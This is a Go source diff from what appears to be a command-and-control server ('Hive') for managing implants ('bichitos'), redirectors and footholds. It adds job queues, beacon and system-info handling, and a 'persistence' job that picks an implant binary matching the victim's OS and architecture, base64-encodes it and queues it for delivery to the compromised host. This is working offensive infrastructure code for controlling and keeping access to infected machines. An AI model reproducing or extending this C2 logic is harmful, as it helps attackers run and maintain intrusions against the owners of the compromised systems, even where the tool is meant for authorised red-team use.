@@ -21,6 +21,8 @@ import (
 	"encoding/json"
     "io/ioutil"
     "encoding/base64"
+    "sync"
+    "strconv"
 
 )
 
@@ -104,24 +106,120 @@ type AddOperator struct {
 }
 
 
+//Queues for Hive/Bichitos Jobs, two different queues to avoid blocking footholds on logn Hive Jobs
+type hiveJobQueue struct {
+    mux  sync.RWMutex
+    Working bool
+    Jobs []*Job
+}
+
+var hivejobqueue *hiveJobQueue
+
+func hiveJobFin(){
+	var empty = &Job{Pid:"Hive"}
+	hivejobqueue.mux.Lock()
+	hivejobqueue.Jobs = append(hivejobqueue.Jobs[:0],hivejobqueue.Jobs[1:]...)
+	hivejobqueue.Working = false
+	hivejobqueue.mux.Unlock()
+	if (len(hivejobqueue.Jobs) != 0){
+		go jobProcessor(empty,true)
+	}
+
+	return
+}
+//
+type bichitosJobQueue struct {
+    mux  sync.RWMutex
+    Working bool
+    Jobs []*Job
+}
+
+var bichitosjobqueue *bichitosJobQueue
+
+func bichitosJobFin(){
+	var empty = &Job{Pid:"None",Chid:"B-"}
+	bichitosjobqueue.mux.Lock()
+	bichitosjobqueue.Jobs = append(bichitosjobqueue.Jobs[:0],bichitosjobqueue.Jobs[1:]...)
+	bichitosjobqueue.Working = false
+	bichitosjobqueue.mux.Unlock()
+	if (len(bichitosjobqueue.Jobs) != 0){
+		go jobProcessor(empty,true)
+	}
+
+	return
+}
 
 
-func jobProcessor(jobO *Job){
+
+
+
+func jobProcessor(jobO *Job,queue bool){
 
 	var(
 		jStatus error
 		jResult error
+
+		cid string
+		pid string
+		chid string
+		job string
+		jid string
+		parameters string
 	)
 
-	cid := jobO.Cid
-	pid := jobO.Pid
-	chid := jobO.Chid
-	jid := jobO.Jid
-	job := jobO.Job
-	parameters := jobO.Parameters
-	//Debug
-	//fmt.Println(job+parameters)
-	if strings.Contains(pid,"Hive"){
+	//Jobs that come from users to Hive
+	if strings.Contains(jobO.Pid,"Hive"){
+
+		//Hive Job Queue: Put Hive Jobs on a queue to avoid DB Write Locks
+		//Debug
+		//fmt.Println(len(hivejobqueue.Jobs))
+
+		if !queue{
+			hivejobqueue.mux.Lock()
+			hivejobqueue.Jobs = append(hivejobqueue.Jobs,jobO)
+			hivejobqueue.mux.Unlock()
+		}
+		
+		if (hivejobqueue.Working){
+			return
+		}else{
+			hivejobqueue.mux.Lock()
+			hivejobqueue.Working = true
+			hivejobqueue.mux.Unlock()	
+		}
+
+
+		defer hiveJobFin()
+
+    	//Don't add Parameters in the Job Log to avoid unnecessary secrets logging
+    	parameters := hivejobqueue.Jobs[0].Parameters
+    	hivejobqueue.Jobs[0].Parameters = "" 
+
+    	//check redundant Jid
+    	errJ := addJobDB(hivejobqueue.Jobs[0])
+    	if errJ != nil {
+        	//ErrorLog
+        	time := time.Now().Format("02/01/2006 15:04:05 MST")
+        	elog := fmt.Sprintf("%s%s","Jobs(Job Already Processed):",errJ.Error())
+        	go addLogDB("Hive",time,elog)
+        	return
+    	}
+
+   		errS := setJobStatusDB(hivejobqueue.Jobs[0].Jid,"Processing")
+    	if errS != nil {
+        	//ErrorLog
+       		time := time.Now().Format("02/01/2006 15:04:05 MST")
+        	elog := fmt.Sprintf("%s%s","Jobs(Error Setting Job Status to Processing):",errS.Error())
+        	go addLogDB("Hive",time,elog)
+        	return
+    	}
+
+		cid = hivejobqueue.Jobs[0].Cid
+		pid = hivejobqueue.Jobs[0].Pid
+		chid = hivejobqueue.Jobs[0].Chid
+		jid = hivejobqueue.Jobs[0].Jid
+		job = hivejobqueue.Jobs[0].Job	
+		jobO = hivejobqueue.Jobs[0]
 
 		switch job{
 			case "createImplant":
@@ -1256,7 +1354,7 @@ func jobProcessor(jobO *Job){
     			//Server Side white-list for Hive Commands
     			if !(namesInputWhite(commandO.Implant) && namesInputWhite(commandO.Staging) && namesInputWhite(stagingO.DomainName) && 
     				namesInputWhite(droplet.Path) && namesInputWhite(commandO.Os) && namesInputWhite(commandO.Arch) && 
-    				namesInputWhite(commandO.Filename)){
+    				filesInputWhite(commandO.Filename)){
 
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-dropImplant(Drop "+commandO.Implant+" Incorrect Param. Formatting)")
@@ -1485,7 +1583,16 @@ func jobProcessor(jobO *Job){
 				return
 		}
 
-	}else if strings.Contains(pid,"R-") && strings.Contains(chid,"None"){
+	// Jobs coming from Redirectors,but not from Footholds
+	}else if strings.Contains(jobO.Pid,"R-") && strings.Contains(jobO.Chid,"None"){
+
+		//Fetch params for Jobs that are not related to Hive
+		cid = jobO.Cid
+		pid = jobO.Pid
+		chid = jobO.Chid
+		jid = jobO.Jid
+		job = jobO.Job
+		parameters = jobO.Parameters
 
 		switch job{
 
@@ -1508,133 +1615,69 @@ func jobProcessor(jobO *Job){
 				elog := fmt.Sprintf("Job by "+cid+":Redirector(Job not implemented)")
 				addLogDB(pid,time,elog)
 		}
-	}else if strings.Contains(chid,"B-"){
+
+	//Jobs that come from users to Footholds	
+	}else if strings.Contains(jobO.Chid,"B-") && !strings.Contains(jobO.Pid,"R-"){
+		
+		var err error
+		//Fetch params for Jobs that are not related to Hive
+		if !queue{
+			bichitosjobqueue.mux.Lock()
+			bichitosjobqueue.Jobs = append(bichitosjobqueue.Jobs,jobO)
+			bichitosjobqueue.mux.Unlock()
+		}
+		
+		if (bichitosjobqueue.Working){
+			return
+		}else{
+			bichitosjobqueue.mux.Lock()
+			bichitosjobqueue.Working = true
+			bichitosjobqueue.mux.Unlock()	
+		}
+
+
+		defer bichitosJobFin()
+
+        bichitosjobqueue.Jobs[0].Pid,err = getRidbyBid(bichitosjobqueue.Jobs[0].Chid)
+        if err != nil {
+            //ErrorLog
+            time := time.Now().Format("02/01/2006 15:04:05 MST")
+            elog := fmt.Sprintf("%s%s","Jobs(Error Getting Rid by Chid):",err.Error())
+            go addLogDB("Hive",time,elog)
+            return
+        } 
+
+    	//check redundant Jid
+    	errJ := addJobDB(bichitosjobqueue.Jobs[0])
+    	if errJ != nil {
+        	//ErrorLog
+        	time := time.Now().Format("02/01/2006 15:04:05 MST")
+        	elog := fmt.Sprintf("%s%s","Jobs(Job Already Processed):",errJ.Error())
+        	go addLogDB("Hive",time,elog)
+        	return
+    	}
+
+   		errS := setJobStatusDB(bichitosjobqueue.Jobs[0].Jid,"Processing")
+    	if errS != nil {
+        	//ErrorLog
+       		time := time.Now().Format("02/01/2006 15:04:05 MST")
+        	elog := fmt.Sprintf("%s%s","Jobs(Error Setting Job Status to Processing):",errS.Error())
+        	go addLogDB("Hive",time,elog)
+        	return
+    	}
+
+
+		cid = bichitosjobqueue.Jobs[0].Cid
+		pid = bichitosjobqueue.Jobs[0].Pid
+		chid = bichitosjobqueue.Jobs[0].Chid
+		jid = bichitosjobqueue.Jobs[0].Jid
+		job = bichitosjobqueue.Jobs[0].Job
+		parameters := bichitosjobqueue.Jobs[0].Parameters
+		jobO = bichitosjobqueue.Jobs[0]
 	
+		go bichitoStatus(bichitosjobqueue.Jobs[0])
+
 		switch job{
-
-			//Deprecated, BiPing can do everything
-			case "BiChecking":
-
-   				//BiCHecking is a encoded bot info for future use
-   				biChecking(chid,pid,parameters)
-				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
-				
-				jobsToProcess.mux.Lock()
-				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
-				jobsToProcess.mux.Unlock()
-
-   				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
-   				errSet1 := setRedLastCheckedDB(pid,timeA)
-   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
-   				errSet3 := setBiRidDB(chid,pid)
-   				if (errSet1 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
-        			return
-   				}
-   				if (errSet2 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
-        			return
-   				}
-   				if (errSet3 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
-        			return
-   				}
-
-
-				return
-
-			//Main Beacon of Implants, will be used to Update the bot and its redirector
-			case "BiPing":
-
-				existB,_ := existBiDB(chid)
-				if !existB{
-					biChecking(chid,pid,parameters)
-				}
-
-				//Check SysInfo, if empty, craft a new Job to retrieve it
-				bichito := getBichitoDB(chid)
-				if (bichito.Info == "") {
-					//fmt.Println("Adding Sysinfo...")
-   				
-					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Processing","",""}
-
-					jobsToProcess.mux.Lock()
-					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
-					jobsToProcess.mux.Unlock()
-				}
-
-				//Debug:
-				//fmt.Println("Adding Received...")
-				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
-
-				jobsToProcess.mux.Lock()
-				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
-				jobsToProcess.mux.Unlock()
-
-   				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
-   				errSet1 := setRedLastCheckedDB(pid,timeA)
-   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
-   				errSet3 := setBiRidDB(chid,pid)
-   				if (errSet1 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
-        			return
-   				}
-   				if (errSet2 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
-        			return
-   				}
-   				if (errSet3 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
-        			return
-   				}
-
-				return
-			case "log":
-				
-				existB,_ := existBiDB(chid)
-				if !existB{
-					biChecking(chid,pid,parameters)
-				}
-
-   				jsconcommanA := make([]Log, 0)
-   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
-   				errD := decoder.Decode(&jsconcommanA)
-   				// Error Log
-    			if errD != nil {
-    				time := time.Now().Format("02/01/2006 15:04:05 MST")
-					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errD.Error())
-					addLogDB("Hive",time,elog)
-					return
-   				}
-   				commandO := jsconcommanA[0]
-				addLogDB(chid,commandO.Time,commandO.Error)
-
-				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
-   				errSet1 := setRedLastCheckedDB(pid,timeA)
-   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
-   				errSet3 := setBiRidDB(chid,pid)
-   				if (errSet1 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
-        			return
-   				}
-   				if (errSet2 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
-        			return
-   				}
-   				if (errSet3 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
-        			return
-   				}
-				return
 			
 			////Jobs Triggered by users
 			//Implant Lifecycle
@@ -2067,6 +2110,292 @@ func jobProcessor(jobO *Job){
 				elog := fmt.Sprintf("Job by "+cid+":Bichito(Job not implemented)")
 				addLogDB(pid,time,elog)
 				return
+		}
+
+	}else if strings.Contains(jobO.Chid,"B-") && strings.Contains(jobO.Pid,"R-"){
+
+
+		cid = jobO.Cid
+		pid = jobO.Pid
+		chid = jobO.Chid
+		jid = jobO.Jid
+		job = jobO.Job
+		result := jobO.Result
+		parameters = jobO.Parameters
+
+		switch job{
+			//Deprecated, BiPing can do everything
+			/*
+			case "BiChecking":
+
+   				//BiCHecking is a encoded bot info for future use
+   				biChecking(chid,pid,parameters)
+				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
+				
+				jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
+				jobsToProcess.mux.Unlock()
+
+   				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
+   				errSet1 := setRedLastCheckedDB(pid,timeA)
+   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
+   				errSet3 := setBiRidDB(chid,pid)
+   				if (errSet1 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
+        			return
+   				}
+   				if (errSet2 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
+        			return
+   				}
+   				if (errSet3 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
+        			return
+   				}
+
+
+				return
+			*/
+
+			//Main Beacon of Implants, will be used to Update the bot and its redirector
+			case "BiPing":
+
+				existB,_ := existBiDB(chid)
+				if !existB{
+					biChecking(chid,pid,parameters)
+				}
+
+				//Check SysInfo, if empty, craft a new Job to retrieve it
+				bichito := getBichitoDB(chid)
+				if (bichito.Info == "") {
+					//fmt.Println("Adding Sysinfo...")
+   				
+					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Processing","",""}
+
+					jobsToProcess.mux.Lock()
+					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
+					jobsToProcess.mux.Unlock()
+				}
+
+				//Debug:
+				//fmt.Println("Adding Received...")
+				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
+
+				jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
+				jobsToProcess.mux.Unlock()
+
+   				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
+   				errSet1 := setRedLastCheckedDB(pid,timeA)
+   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
+   				errSet3 := setBiRidDB(chid,pid)
+   				if (errSet1 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
+        			return
+   				}
+   				if (errSet2 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
+        			return
+   				}
+   				if (errSet3 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
+        			return
+   				}
+
+				return
+
+			case "sysinfo":
+        		err1 := setBiInfoDB(chid,result)
+        		if err1 != nil {
+            		//ErrorLog
+            		time := time.Now().Format("02/01/2006 15:04:05 MST")
+            		elog := fmt.Sprintf("%s%s","Jobs(Error Saving Bichito "+chid+" Sysinfo to DB):",err1.Error())
+            		go addLogDB("Hive",time,elog)
+            		return
+        		}
+				return
+
+			case "respTime":
+        		i, _ := strconv.Atoi(parameters)
+        		err2 := setBichitoRespTimeDB(chid,i)
+        		if err2 != nil {
+            		//ErrorLog
+            		time := time.Now().Format("02/01/2006 15:04:05 MST")
+            		elog := fmt.Sprintf("%s%s","Jobs(Error Changing Bichito "+chid+" Resptime to DB):",err2.Error())
+            		go addLogDB("Hive",time,elog)
+            		return
+        		}
+				return
+
+			case "log":
+				
+				existB,_ := existBiDB(chid)
+				if !existB{
+					biChecking(chid,pid,parameters)
+				}
+
+   				jsconcommanA := make([]Log, 0)
+   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
+   				errD := decoder.Decode(&jsconcommanA)
+   				// Error Log
+    			if errD != nil {
+    				time := time.Now().Format("02/01/2006 15:04:05 MST")
+					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errD.Error())
+					addLogDB("Hive",time,elog)
+					return
+   				}
+   				commandO := jsconcommanA[0]
+				addLogDB(chid,commandO.Time,commandO.Error)
+
+				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
+   				errSet1 := setRedLastCheckedDB(pid,timeA)
+   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
+   				errSet3 := setBiRidDB(chid,pid)
+   				if (errSet1 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
+        			return
+   				}
+   				if (errSet2 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
+        			return
+   				}
+   				if (errSet3 != nil){
+       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
+        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
+        			return
+   				}
+				return
+
+			case "persistence":
+
+				existB,_ := existBiDB(chid)
+				if !existB{
+					biChecking(chid,pid,parameters)
+				}
+
+				//Check SysInfo, if empty, craft a new Job to retrieve it
+				bichito := getBichitoDB(chid)
+				if (bichito.Info == "") {
+   				
+					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Sending","",""}
+
+					jobsToProcess.mux.Lock()
+					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
+					jobsToProcess.mux.Unlock()
+					return
+				}
+
+				//Parse sysinfo and get target OS and architecture
+				var biInfo *SysInfo
+				errDaws := json.Unmarshal([]byte(bichito.Info),&biInfo)
+				if errDaws != nil {
+    				time := time.Now().Format("02/01/2006 15:04:05 MST")
+					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errDaws.Error())
+					addLogDB("Hive",time,elog)
+					return
+				}
+
+				//Need to fix this one to just detect "COmpiled for String --> Compiled for x64: Intel x86-64h Haswell"
+				compiledFor := strings.Split(biInfo.Arch,":")[0]
+				x64 := strings.Contains(compiledFor,"64")
+				x32 := strings.Contains(compiledFor,"86")
+
+				windows := strings.Contains(biInfo.Os,"windows")
+				linux := strings.Contains(biInfo.Os,"linux")
+				darwin := strings.Contains(biInfo.Os,"darwin")
+
+				var implantPath string
+
+				switch{
+					case (x32 && windows):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32"
+					case (x64 && windows):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx64"
+					case (x32 && linux):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx32"
+					case (x64 && linux):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx64"
+					case (x32 && darwin):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx32"
+					case (x64 && darwin):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx64"
+					default:
+					    time := time.Now().Format("02/01/2006 15:04:05 MST")
+						elog := fmt.Sprintf("Error in persistence for: "+chid+" no executablePath found.")
+						addLogDB("Hive",time,elog)
+						return	
+				}
+
+
+        		//Get Target Implant
+        		implant, err := ioutil.ReadFile(implantPath)
+        		if err != nil {
+    				time := time.Now().Format("02/01/2006 15:04:05 MST")
+					elog := fmt.Sprintf("Persistence by "+chid+": Error reading implant"+err.Error())
+					addLogDB("Hive",time,elog)
+					return
+        		}
+
+        		//Set the output of the file on "Result"
+        		jobO.Result = base64.StdEncoding.EncodeToString(implant)
+
+    			jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+
+				return
+			
+			default:
+    			//These Bichito jobs are the ones generated by Users, that came back to be updated with results
+    			err2 := updateJobDB(jobO)
+    			if err2 != nil {
+        			//ErrorLog
+        			time := time.Now().Format("02/01/2006 15:04:05 MST")
+        			elog := fmt.Sprintf("Job "+jobO.Jid+"Type: "+jobO.Job+"(Not existent or already Finished,Possible Replay attack/Problem):"+err2.Error())
+        			go addLogDB("Hive",time,elog)
+        			return
+    			}			
+
+    			//Update Last Actives and Redirectors/Bichitos if PiggyBAcking Job is correct
+    			time1 := time.Now().Format("02/01/2006 15:04:05 MST")
+    
+    			errRLC := setRedLastCheckedDB(jobO.Pid,time1)
+    			if errRLC != nil {
+        			//ErrorLog
+        			time := time.Now().Format("02/01/2006 15:04:05 MST")
+        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting "+jobO.Pid+" lastchecked to DB):",errRLC.Error())
+        			go addLogDB("Hive",time,elog)
+        			return
+    			}    
+    
+    			errRLB := setBiLastCheckedbyBidDB(jobO.Chid,time1)
+    			if errRLB != nil {
+        			//ErrorLog
+        			time := time.Now().Format("02/01/2006 15:04:05 MST")
+        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting "+jobO.Chid+" lastchecked to DB):",errRLB.Error())
+        			go addLogDB("Hive",time,elog)
+        			return
+    			}	    
+    
+    			errRB := setBiRidDB(jobO.Chid,jobO.Pid)
+    			if errRB != nil {
+        			//ErrorLog
+        			time := time.Now().Format("02/01/2006 15:04:05 MST")
+        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting red: "+jobO.Pid+" to bi: "+jobO.Chid+" to DB):",errRB.Error())
+        			go addLogDB("Hive",time,elog)
+        			return
+    			}    
+    
+    			return
+		
 		}
 
 	}
